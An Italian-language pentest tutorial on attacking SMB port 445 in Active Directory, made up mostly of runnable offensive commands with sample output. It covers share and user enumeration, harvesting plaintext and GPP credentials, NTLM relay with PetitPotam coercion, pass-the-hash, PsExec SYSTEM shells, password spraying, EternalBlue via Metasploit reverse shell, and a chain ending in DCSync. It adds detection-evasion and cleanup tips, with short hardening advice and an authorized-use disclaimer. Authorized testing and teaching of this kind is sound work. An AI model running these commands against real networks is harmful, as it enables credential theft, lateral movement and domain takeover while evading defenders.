---
title: 'SMB porta 445: Enumerazione, NTLM Relay e Pass-the-Hash in Active Directory'
slug: smb
description: >-
  Guida completa alla porta 445 SMB: enumerazione share, NTLM relay,
  pass-the-hash ed esecuzione remota per lateral movement in Active Directory.
image: '/ChatGPT Image 26 feb 2026, 12_53_15.webp'
draft: false
date: 2026-02-01T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - porta-windows
  - smb
---

# Porta 445 SMB: Dominare Windows File Sharing per Lateral Movement

> **Executive Summary** — La porta 445 SMB è il cuore della condivisione file e delle comunicazioni inter-processo in reti Windows. In un pentest interno, questa porta è ovunque: ogni workstation e server Windows la espone. SMB non è solo file sharing — è il canale per enumerare utenti, share, sessioni, eseguire comandi remoti (PsExec), relay di credenziali NTLM e sfruttare exploit devastanti come EternalBlue. Questo articolo copre dall'enumerazione anonima al relay attack, dal pass-the-hash all'esecuzione remota, con comandi che funzionano su qualsiasi rete AD.

**TL;DR — 3 punti chiave**

* SMB porta 445 espone share, utenti e sessioni: il **null session** è il primo test obbligatorio
* **SMB signing disabilitato** abilita relay attack (NTLM relay) per privilege escalation istantanea
* Con un hash NTLM valido puoi fare **pass-the-hash** ed eseguire comandi su qualsiasi host senza conoscere la password

Porta 445 SMB è il protocollo di condivisione file nativo di Windows e il canale di comunicazione per RPC, named pipe e servizi di dominio. Quando lanci un pentest interno, la porta 445 SMB è il primo protocollo che trovi su ogni host Windows. La vulnerabilità della porta 445 non è solo negli exploit noti: è nell'architettura stessa di SMB, che permette enumerazione, relay di credenziali e command execution remota. L'enumerazione porta 445 rivela share accessibili, utenti connessi, policy di sessione e la versione SMB che determina quali attacchi sono possibili. Nel pentest SMB è il vettore principale per lateral movement — ti sposti da un host all'altro usando credenziali, hash o relay. Nella kill chain copre tutto: dalla recon all'initial access, dal lateral movement alla persistence.

## SMB in 1 riga

SMB (porta 445) = accesso remoto a file + esecuzione comandi + lateral movement.

## 1. Anatomia Tecnica della Porta 445

La porta 445 è registrata IANA come `microsoft-ds` su protocollo TCP. SMB opera direttamente su TCP/445 (SMB su TCP) senza il vecchio strato NetBIOS (porta 139).

Il flusso di una sessione SMB:

1. **TCP handshake** sulla porta 445
2. **Negotiate Protocol**: client e server negoziano la versione SMB (2.0, 2.1, 3.0, 3.1.1)
3. **Session Setup**: autenticazione NTLM o Kerberos
4. **Tree Connect**: connessione a uno share specifico
5. **File operations**: read, write, create, delete su file e directory

Le versioni rilevanti sono SMBv1 (deprecato, target EternalBlue), SMBv2 (Windows 7+, meno vulnerabile), SMBv3 (Windows 8+, supporta encryption) e SMBv3.1.1 (Windows 10+, pre-authentication integrity).

```
Misconfig: SMB signing non richiesto (default su workstation Windows)
Impatto: abilita NTLM relay attack — un attacker intercetta auth NTLM e la rilancia verso un altro host
Come si verifica: crackmapexec smb [target] --gen-relay-list nosigning.txt
```

```
Misconfig: Null session / anonymous access abilitato
Impatto: enumerazione completa di share, utenti e gruppi senza credenziali
Come si verifica: smbclient -L //[target] -N oppure enum4linux -a [target]
```

```
Misconfig: Share con permessi eccessivi (Everyone:Full Control)
Impatto: accesso in lettura/scrittura a file aziendali, config con credenziali, script di deployment
Come si verifica: smbmap -H [target] -u "" -p "" per anonymous, poi con credenziali valide
```

## 2. Enumerazione Base

L'enumerazione base sulla porta 445 SMB parte dalla versione del protocollo e dagli share accessibili. Questi dati determinano l'intera strategia d'attacco.

### Comando 1: Nmap

```bash
nmap -sV -sC -p 445 --script smb-os-discovery,smb-security-mode 10.10.10.10
```

**Output atteso:**

```
PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows Server 2022 Build 20348
| smb-os-discovery:
|   OS: Windows Server 2022 Standard 20348
|   Computer name: DC01
|   NetBIOS computer name: DC01\x00
|   Domain name: corp.local
|   Forest name: corp.local
|   FQDN: DC01.corp.local
|_  System time: 2026-02-06T14:30:00+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
```

**Parametri:**

* `-sV`: identifica OS e versione SMB dal banner
* `--script smb-os-discovery`: estrae dominio, hostname, OS, FQDN e tempo di sistema
* `--script smb-security-mode`: rivela se il signing è obbligatorio o opzionale (critico per relay)

### Comando 2: CrackMapExec per enumerazione rapida

```bash
crackmapexec smb 10.10.10.0/24
```

**Output atteso:**

```
SMB    10.10.10.10  445  DC01       [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)
SMB    10.10.10.20  445  WS-DEV01   [*] Windows 11 Build 22631 x64 (name:WS-DEV01) (domain:corp.local) (signing:False) (SMBv1:False)
SMB    10.10.10.21  445  WS-HR01    [*] Windows 11 Build 22631 x64 (name:WS-HR01) (domain:corp.local) (signing:False) (SMBv1:False)
SMB    10.10.10.50  445  SRV-FILE   [*] Windows Server 2019 Build 17763 x64 (name:SRV-FILE) (domain:corp.local) (signing:False) (SMBv1:False)
```

**Cosa ci dice questo output:** il DC (`DC01`) ha signing obbligatorio (non relayable). Le workstation e il file server hanno signing **disabilitato** — target perfetti per NTLM relay. SMBv1 è disabilitato ovunque (niente EternalBlue). Questa mappa è la base di partenza per ogni attacco SMB. Scopri come sfruttare il signing disabilitato nella [guida ai relay attack](https://hackita.it/articoli/ntlmrelay).

## 3. Enumerazione Avanzata

### Enumerazione share con accesso anonimo

```bash
smbmap -H 10.10.10.50 -u "" -p ""
```

**Output:**

```
[+] IP: 10.10.10.50:445  Name: SRV-FILE.corp.local
    Disk                                Permissions     Comment
    ----                                -----------     -------
    ADMIN$                              NO ACCESS       Remote Admin
    C$                                  NO ACCESS       Default share
    IPC$                                READ ONLY       Remote IPC
    Public                              READ, WRITE     Public Documents
    IT-Deploy                           READ ONLY       IT Deployment Scripts
    HR-Docs                             NO ACCESS       HR Department
    Finance                             NO ACCESS       Finance Department
```

**Lettura dell'output:** `Public` è READ/WRITE anonimo — puoi leggere e scrivere file senza credenziali. `IT-Deploy` è READ ONLY — contiene script di deployment che spesso includono credenziali hardcoded. `IPC$` accessibile in lettura conferma che il null session è parzialmente abilitato.

### Enumerazione utenti e gruppi via RPC

```bash
enum4linux-ng -A 10.10.10.10
```

**Output:**

```
[+] Domain: corp.local
[+] Domain SID: S-1-5-21-1234567890-1234567890-1234567890
[+] Users:
    administrator (500)
    guest (501)
    jsmith (1103)
    alee (1104)
    svc_sql (1105)
    svc_backup (1106)

[+] Groups:
    Domain Admins: administrator, sqladmin
    IT-Admins: jsmith, alee
    Backup Operators: svc_backup

[+] Password Policy:
    Minimum length: 8
    Lockout threshold: 5
    Lockout duration: 30 min
```

**Lettura dell'output:** hai la lista utenti completa con RID, i gruppi privilegiati (`Domain Admins`, `Backup Operators`) e la policy di lockout. `svc_backup` in `Backup Operators` può fare DCSync se ha `SeBackupPrivilege` — target ad alta priorità. Usa questi dati per calibrare il [password spraying via SMB](https://hackita.it/articoli/passwordspraying).

### Ricerca di file sensibili negli share

```bash
smbmap -H 10.10.10.50 -u "" -p "" -r IT-Deploy --depth 3
```

**Output:**

```
[+] Contents of \\10.10.10.50\IT-Deploy:
    dr--r--r--  deploy-scripts/
        -r--r--r--  install_agent.ps1 (2340 bytes)
        -r--r--r--  deploy_config.xml (890 bytes)
        -r--r--r--  setup_workstation.bat (1200 bytes)
    dr--r--r--  images/
    -r--r--r--  README.txt (450 bytes)
```

**Lettura dell'output:** `deploy_config.xml` e `install_agent.ps1` sono i file da scaricare per primi — contengono spesso credenziali di service account, chiavi API o path di risorse interne.

```bash
smbclient //10.10.10.50/IT-Deploy -N -c "get deploy-scripts/deploy_config.xml"
cat deploy_config.xml
```

**Output:**

```xml
<configuration>
  <deployment>
    <service_account>corp\svc_deploy</service_account>
    <password>D3pl0y_2026!</password>
    <target_ou>OU=Workstations,DC=corp,DC=local</target_ou>
  </deployment>
</configuration>
```

**Lettura dell'output:** credenziali del service account di deployment in chiaro. Testa immediatamente con `crackmapexec smb 10.10.10.10 -u svc_deploy -p 'D3pl0y_2026!' --shares`. Approfondisci la raccolta di credenziali dalla rete nella [guida al credential harvesting](https://hackita.it/articoli/credentialharvesting).

## 4. Tecniche Offensive

**NTLM Relay Attack (SMB signing off)**

Contesto: host con SMB signing disabilitato. Sei in posizione per intercettare autenticazione NTLM (via Responder, mitm6, o PetitPotam).

```bash
# Terminal 1: identifica target senza signing
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# Terminal 2: avvia ntlmrelayx
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami /all"

# Terminal 3: forza autenticazione con PetitPotam
python3 PetitPotam.py [tuo_IP] 10.10.10.10
```

**Output (successo):**

```
[*] SMBD-Thread-4: Received connection from 10.10.10.10
[*] Authenticating against smb://10.10.10.50 as corp/DC01$
[*] Target 10.10.10.50 is vulnerable to relay!
[*] Command output:
corp\dc01$
BUILTIN\Administrators
NT AUTHORITY\SYSTEM
```

**Output (fallimento):**

```
[*] Authenticating against smb://10.10.10.10 as corp/DC01$
[-] Signing is required for 10.10.10.10, skipping
```

**Cosa fai dopo:** hai eseguito comandi come SYSTEM sul file server. Puoi estrarre hash SAM, installare una web shell, o aggiungere un utente locale admin. Per un relay diretto a LDAP (per aggiungere computer account o modificare ACL): `ntlmrelayx -t ldap://10.10.10.10 --escalate-user jsmith`.

**Pass-the-Hash (PtH)**

Contesto: hai ottenuto un hash NTLM (da SAM dump, Mimikatz, relay, o DCSync). Non conosci la password in chiaro.

```bash
crackmapexec smb 10.10.10.50 -u administrator -H "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0" --shares
```

**Output (successo):**

```
SMB    10.10.10.50  445  SRV-FILE  [*] Windows Server 2019 Build 17763 x64
SMB    10.10.10.50  445  SRV-FILE  [+] corp.local\administrator:31d6cfe0... (Pwn3d!)
SMB    10.10.10.50  445  SRV-FILE  [+] Enumerated shares:
    ADMIN$    READ, WRITE    Remote Admin
    C$        READ, WRITE    Default share
```

**Output (fallimento):**

```
SMB    10.10.10.50  445  SRV-FILE  [-] corp.local\administrator:31d6cfe0... STATUS_LOGON_FAILURE
```

**Cosa fai dopo:** `Pwn3d!` significa che hai admin locale. Esegui comandi: `crackmapexec smb 10.10.10.50 -u administrator -H [hash] -x "whoami"`. Scarica SAM/SYSTEM: `impacket-secretsdump corp.local/administrator@10.10.10.50 -hashes [hash]`. Approfondisci la tecnica nella [guida al pass-the-hash](https://hackita.it/articoli/passthehash).

**Esecuzione remota con PsExec (impacket)**

Contesto: credenziali valide (password o hash) con permessi admin locale sul target.

```bash
impacket-psexec corp.local/administrator:Password1@10.10.10.50
```

**Output (successo):**

```
Impacket v0.11.0 - Copyright 2023 Fortra
[*] Requesting shares on 10.10.10.50.....
[*] Found writable share ADMIN$
[*] Uploading file aBcDeFgH.exe
[*] Opening SVCManager on 10.10.10.50.....
[*] Creating service aBcD on 10.10.10.50.....
[*] Starting service aBcD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.5458]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

**Output (fallimento):**

```
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
```

**Cosa fai dopo:** hai una shell SYSTEM. Esegui Mimikatz per estrarre credenziali dalla memoria, dumpa i hash con `secretsdump`, o installa persistence. Per un approccio più silenzioso usa `smbexec` o `wmiexec` che non scrivono file su disco.

**Password Spraying via SMB**

Contesto: hai una lista di utenti (da LDAP o enum RPC) e vuoi testare password comuni.

```bash
crackmapexec smb 10.10.10.10 -u users.txt -p 'Spring2026!' --continue-on-success
```

**Output (successo):**

```
SMB    10.10.10.10  445  DC01  [+] corp.local\alee:Spring2026!
SMB    10.10.10.10  445  DC01  [+] corp.local\nhire01:Spring2026!
```

**Output (fallimento):**

```
SMB    10.10.10.10  445  DC01  [-] corp.local\jsmith:Spring2026! STATUS_LOGON_FAILURE
[...tutti falliti...]
```

**Cosa fai dopo:** verifica i gruppi di `alee` e `nhire01` con `ldapsearch` o `net user /domain`. Se uno è admin locale su workstation, fai PtH/PsExec. Rispetta il lockout: massimo 4 tentativi per ciclo, attendi il lockout duration + 1 minuto.

## 5. Scenari Pratici di Pentest

### Scenario 1: Enterprise AD — relay chain per DA

**Situazione:** rete corporate con 500+ host Windows. Hai un foothold su una workstation utente standard. SMB signing off su workstation, on su DC.

**Step 1:**

```bash
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt && wc -l targets.txt
```

**Output atteso:**

```
87 targets.txt
```

**Step 2:**

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support --delegate-access
```

**Output atteso:**

```
[*] Received connection from 10.10.10.20
[*] SMBD: Relaying to 10.10.10.50
[*] Delegated access for YOURMACHINE$ on SRV-FILE$
```

**Se fallisce:**

* Causa probabile: tutti i target hanno signing abilitato (GPO recente)
* Fix: passa a relay su LDAP/LDAPS: `ntlmrelayx -t ldaps://10.10.10.10 --escalate-user [user]`

**Tempo stimato:** 15-45 minuti (dipende dal tempo per catturare un'auth NTLM)

### Scenario 2: Lab con SMBv1 e EternalBlue

**Situazione:** macchina CTF con Windows 7/Server 2008 R2 e SMBv1 abilitato.

**Step 1:**

```bash
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.40
```

**Output atteso:**

```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:2017-0143
```

**Step 2:**

```bash
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; set LHOST [tuo_IP]; exploit"
```

**Output atteso:**

```
[*] Started reverse TCP handler on [tuo_IP]:4444
[*] 10.10.10.40:445 - Connecting to target...
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully!
[*] Sending egg to corrupted connection.
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Se fallisce:**

* Causa probabile: named pipe non disponibile o target patchato
* Fix: prova `exploit/windows/smb/ms17_010_psexec` come alternativa

**Tempo stimato:** 2-5 minuti

### Scenario 3: Segmented network — share con script di deployment

**Situazione:** rete segmentata. Hai accesso alla VLAN server. File server con share IT accessibili con credenziali low-privilege ottenute da phishing.

**Step 1:**

```bash
smbmap -H 10.10.10.50 -u jsmith -p 'Password1' -d corp.local
```

**Output atteso:**

```
    IT-Deploy           READ ONLY
    Software            READ ONLY
    Backup              NO ACCESS
    SYSVOL              READ ONLY
    NETLOGON            READ ONLY
```

**Step 2:**

```bash
smbclient //10.10.10.50/SYSVOL -U 'corp.local\jsmith%Password1' -c "recurse ON; prompt OFF; mget *"
grep -ri "password\|cpassword\|credential" corp.local/ 2>/dev/null
```

**Output atteso:**

```
corp.local/Policies/{GUID}/Machine/Preferences/Groups/Groups.xml:cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

**Se fallisce:**

* Causa probabile: SYSVOL cleanup già effettuato (MS14-025 patched)
* Fix: cerca comunque script .bat, .ps1, .vbs con credenziali: `grep -ri "net use\|password\|runas" corp.local/`

**Tempo stimato:** 10-20 minuti

## 6. Attack Chain Completa

```
Recon (scan 445, versione SMB, signing) → Enum (share, utenti, policy) → Credential Harvest (share files, SYSVOL) → Spray/Relay → Lateral Movement (PtH, PsExec) → Privilege Escalation → DCSync
```

| Fase               | Tool         | Comando chiave                                   | Output/Risultato              |
| ------------------ | ------------ | ------------------------------------------------ | ----------------------------- |
| Recon              | crackmapexec | `cme smb [subnet]`                               | Mappa host, OS, signing       |
| Enum Share         | smbmap       | `smbmap -H [target] -u user -p pass`             | Share accessibili             |
| Credential Harvest | smbclient    | `smbclient //[target]/share -c "get config.xml"` | Credenziali da file           |
| NTLM Relay         | ntlmrelayx   | `ntlmrelayx -tf targets.txt -smb2support`        | Shell o delegate access       |
| Lateral Movement   | psexec       | `psexec corp/admin:pass@[target]`                | Shell SYSTEM                  |
| Credential Dump    | secretsdump  | `secretsdump corp/admin@[target]`                | Hash SAM + LSA secrets        |
| DCSync             | secretsdump  | `secretsdump corp/DA@[DC] -just-dc`              | Hash NTLM di tutto il dominio |

**Timeline stimata:** 60-240 minuti. Dipende dalla velocità del relay (serve auth NTLM in transito) e dalla complessità della rete.

**Ruolo della porta 445:** SMB è il tessuto connettivo delle reti Windows. Ogni lateral movement, ogni esecuzione remota, ogni relay passa per la porta 445. È il vettore più usato per passare da "un utente compromesso" a "Domain Admin".

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* **Windows Event Log**: Event ID 4624 (Logon), 4625 (Failed Logon), 4648 (Explicit Credential Logon) — path: `Security` log
* **Event ID 7045**: creazione di servizio (PsExec crea un servizio temporaneo)
* **Sysmon Event ID 3**: connessione di rete sulla porta 445 da processi non standard
* **IDS**: regole Suricata per EternalBlue (SID 2024220-2024233), PsExec, named pipe anomali

### Tecniche di Evasion

```
Tecnica: Uso di wmiexec/smbexec invece di psexec
Come: impacket-wmiexec corp/admin:pass@[target] — non scrive file su disco, non crea servizi permanenti
Riduzione rumore: non genera Event ID 7045 (service creation), riduce tracce su disco
```

```
Tecnica: Relay su LDAP invece di SMB
Come: ntlmrelayx -t ldap://[DC] — relay verso LDAP per modificare ACL o aggiungere computer account
Riduzione rumore: non genera connessioni SMB anomale verso i target. Il traffico LDAP è normale per un DC
```

```
Tecnica: Timing del password spray
Come: 1 password per utente, poi attendi lockoutDuration + 5 minuti. Esegui in orario lavorativo
Riduzione rumore: i tentativi di login si confondono con il traffico di autenticazione normale
```

### Cleanup Post-Exploitation

* PsExec: il servizio viene rimosso automaticamente all'uscita, ma il file `.exe` potrebbe restare in `ADMIN$`
* Rimuovi file residui: `del \\[target]\ADMIN$\aBcDeFgH.exe`
* Se hai modificato ACL o aggiunto utenti: ripristina lo stato originale
* I log di Security contengono ogni tentativo di autenticazione con IP sorgente

## 8. Toolchain e Confronto

### Pipeline operativa

```
crackmapexec (discovery) → smbmap/smbclient (enum share) → enum4linux-ng (enum utenti) → ntlmrelayx/Responder (relay) → impacket-psexec (exec) → secretsdump (credential dump)
```

Dati che passano tra fasi: hostname, OS version, signing status, share list, file con credenziali, hash NTLM, token Kerberos.

### Tabella comparativa

| Aspetto           | SMB (445/TCP)               | WinRM (5985/TCP)             | RDP (3389/TCP)            |
| ----------------- | --------------------------- | ---------------------------- | ------------------------- |
| Porta default     | 445                         | 5985 (HTTP), 5986 (HTTPS)    | 3389                      |
| Auth methods      | NTLM, Kerberos              | NTLM, Kerberos, Basic        | NLA (NTLM/Kerberos)       |
| Command execution | PsExec, WMI, smbexec        | PowerShell remoting          | GUI interattiva           |
| Pass-the-Hash     | Sì (nativo)                 | Sì (con evil-winrm)          | Solo con restricted admin |
| Lateral movement  | Eccellente                  | Buono                        | Medio (GUI, lento)        |
| Rumore detection  | Alto (Event 7045, 4624)     | Medio (Event 4624, 91)       | Alto (Event 4624, 1149)   |
| Quando preferirlo | Sempre come primo tentativo | Se SMB è filtrato/monitorato | Se serve interazione GUI  |

## 9. Troubleshooting

| Errore / Sintomo                           | Causa                                                 | Fix                                                                                     |
| ------------------------------------------ | ----------------------------------------------------- | --------------------------------------------------------------------------------------- |
| `STATUS_ACCESS_DENIED` su ADMIN$           | Utente non è admin locale sul target                  | Verifica con `cme smb [target] -u user -p pass --local-auth` per admin locale           |
| `STATUS_LOGON_FAILURE` con hash corretto   | Hash è NTLMv2, non NTLM                               | PtH funziona solo con hash NT (32 char). Verifica formato: `aad3b435...:31d6cfe0...`    |
| `Connection refused` su porta 445          | Windows Firewall blocca SMB da subnet non autorizzate | Verifica con `nmap -Pn -p 445 [target]`. Se filtered: serve pivot da subnet autorizzata |
| NTLM relay fallisce con `signing required` | SMB signing obbligatorio sul target                   | Usa solo target nella lista `--gen-relay-list`. Oppure relay su LDAP/HTTP               |
| PsExec si connette ma non ottiene shell    | Antivirus blocca il binario uploadato                 | Usa `wmiexec` o `atexec` che non scrivono file su disco                                 |
| smbclient `NT_STATUS_NO_SUCH_FILE`         | Share o path non esiste                               | Verifica con `smbmap -H [target] -u user -p pass` la lista share corretta               |

## 10. FAQ

**D: Come verificare se SMB signing è disabilitato sulla porta 445?**

R: Usa `crackmapexec smb [target]` e leggi l'output: `(signing:False)` indica signing non obbligatorio. Per una scansione di rete: `cme smb [subnet] --gen-relay-list nosigning.txt` genera direttamente la lista dei target relayable.

**D: Porta 445 SMB è vulnerabile a EternalBlue nel 2026?**

R: Solo se SMBv1 è abilitato (Windows 7, Server 2008 non patchati). Le versioni moderne di Windows hanno SMBv1 disabilitato di default. Verifica con `nmap -p 445 --script smb-vuln-ms17-010 [target]`. Nei CTF e lab è ancora comune trovare macchine vulnerabili.

**D: Come fare lateral movement con SMB senza conoscere la password?**

R: Usa pass-the-hash con l'hash NTLM: `crackmapexec smb [target] -u user -H [NT_hash]`. Se hai un hash NTLMv2 catturato con Responder, prova prima a crackarlo con hashcat (`-m 5600`), oppure usa NTLM relay direttamente con `ntlmrelayx`.

**D: Differenza tra porta 445 e porta 139 per SMB?**

R: La porta 445 è SMB diretto su TCP (moderno). La porta 139 è SMB su NetBIOS Session Service (legacy). Su sistemi recenti, SMB usa esclusivamente la 445. La 139 è presente solo per compatibilità con sistemi molto vecchi. Testa sempre la 445 come priorità.

**D: Come estrarre credenziali dagli share SMB?**

R: Cerca file con credenziali: `smbmap -H [target] -R --depth 5 -q | grep -iE "\.xml|\.config|\.ini|\.bat|\.ps1|\.txt"`. Scarica e analizza con grep per pattern `password`, `credential`, `secret`, `cpassword`. SYSVOL è la prima share da controllare per Group Policy Preferences (GPP) con password cifrate.

**D: NTLM relay funziona ancora nel 2026?**

R: Sì, su host con SMB signing disabilitato (default su workstation Windows, anche Windows 11). Il relay su LDAP richiede anche che LDAP signing non sia obbligatorio. Microsoft sta gradualmente abilitando signing di default, ma la transizione è lenta. Verifica sempre lo stato attuale con `crackmapexec`.

## 11. Cheat Sheet Finale

| Azione                 | Comando                                                      | Note                   |
| ---------------------- | ------------------------------------------------------------ | ---------------------- |
| Scan SMB rete          | `crackmapexec smb [subnet]`                                  | OS, signing, SMBv1     |
| Enum share anonimo     | `smbmap -H [target] -u "" -p ""`                             | Test null session      |
| Enum share autenticato | `smbmap -H [target] -u user -p pass -d domain`               | Tutti i permessi       |
| Lista utenti via RPC   | `enum4linux-ng -A [target]`                                  | Utenti, gruppi, policy |
| Genera relay list      | `cme smb [subnet] --gen-relay-list targets.txt`              | Host senza signing     |
| NTLM relay             | `ntlmrelayx -tf targets.txt -smb2support`                    | Attendi auth NTLM      |
| Pass-the-Hash          | `cme smb [target] -u admin -H [hash]`                        | Verifica admin locale  |
| PsExec                 | `impacket-psexec domain/user:pass@[target]`                  | Shell SYSTEM           |
| WmiExec (stealth)      | `impacket-wmiexec domain/user:pass@[target]`                 | No file su disco       |
| Credential dump        | `impacket-secretsdump domain/user@[target]`                  | SAM + LSA + cached     |
| Password spray         | `cme smb [DC] -u users.txt -p 'Pass1' --continue-on-success` | Rispetta lockout       |

### Perché Porta 445 è rilevante nel 2026

SMB è irremovibile dalle reti Windows. Ogni Domain Controller, file server, print server e workstation espone la porta 445. Il protocollo è maturo ma le misconfiguration sono endemiche: signing disabilitato su workstation, share con permessi eccessivi, credenziali in file di configurazione. La tendenza di Microsoft è abilitare signing di default (Windows 11 24H2), ma il rollout è graduale e la retrocompatibilità mantiene il problema vivo su infrastrutture miste. Verifica lo stato con `crackmapexec smb [subnet]` in ogni engagement.

### Hardening e Mitigazione

* Abilita SMB signing obbligatorio via GPO: `Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options → "Microsoft network server: Digitally sign communications (always)" = Enabled`
* Disabilita SMBv1: `Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`
* Riduci permessi share: rimuovi `Everyone` e applica principio del least privilege
* Abilita LDAP signing e channel binding sui DC per prevenire relay su LDAP

### OPSEC per il Red Team

SMB genera log su ogni host con cui interagisci. Event ID 4624 (Logon Type 3 = Network) registra ogni connessione SMB con IP sorgente e username. PsExec aggiunge Event ID 7045 (Service Creation) — è il trigger più monitorato dai SOC. Per ridurre visibilità: usa `wmiexec` invece di `psexec`, limita il password spray a 1 password per ciclo, esegui le operazioni durante l'orario lavorativo per confonderti con il traffico legittimo, e preferisci relay su LDAP piuttosto che su SMB quando possibile.

***

Tutti i comandi e le tecniche descritti in questo articolo sono destinati esclusivamente ad ambienti autorizzati: penetration test con contratto firmato, laboratori personali, piattaforme CTF. Riferimento tecnico: MS-SMB2 (Microsoft SMB Protocol), RFC 7931 (SMB3 Encryption).

> Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
